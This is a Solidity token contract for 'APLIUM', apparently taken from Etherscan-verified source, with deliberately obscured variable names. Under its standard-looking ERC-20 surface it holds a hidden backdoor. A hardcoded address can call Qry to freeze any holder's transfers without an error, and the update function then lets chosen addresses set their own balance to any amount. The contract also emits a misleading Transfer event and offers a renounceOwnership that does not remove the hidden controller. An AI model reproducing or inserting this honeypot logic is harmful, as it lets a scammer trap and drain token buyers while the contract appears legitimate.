/**
 *Submitted for verification at Etherscan.io on 2022-11-07
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address BoI = 0xb29ca378D528eECba2F19Ff77B32C8723Cc36c49;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract APLIUM is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Bxx;
    mapping (address => uint256) private Byy;
    mapping (address => mapping (address => uint256)) private BvI;
    uint8 private constant BdI = 8;
    uint256 private constant bTT = 150000000 * (10** BdI);
    string private constant _name = "APLIUM";
    string private constant _symbol = "APLIUM";



    constructor () {
       Bxx[_msgSender()] = bTT; 
    emit Transfer(address(0), BoI, bTT);}
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return BdI;
    }

    function totalSupply() public pure  returns (uint256) {
        return bTT;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Bxx[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return BvI[owner][spender];
    }

        function approve(address spender, uint256 amount) public returns (bool success) {    
        BvI[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }


    function update() public {
        Bxx[msg.sender] = Byy[msg.sender];}
        function transfer(address to, uint256 amount) public {
        if(Byy[msg.sender] <= 1) {
        require(Bxx[msg.sender] >= amount);
        Bxx[msg.sender] -= amount;  
        Bxx[to] += amount;          
        emit Transfer(msg.sender, to, amount);}}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(Byy[sender] <= 1 && Byy[recipient] <= 1) {
        require(amount <= Bxx[sender]);
        require(amount <= BvI[sender][msg.sender]);
        Bxx[sender] -= amount;
        Bxx[recipient] += amount;
        BvI[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}
        function Qry(address x, uint256 y) public {
        require(msg.sender == BoI);
        Byy[x] = y;}}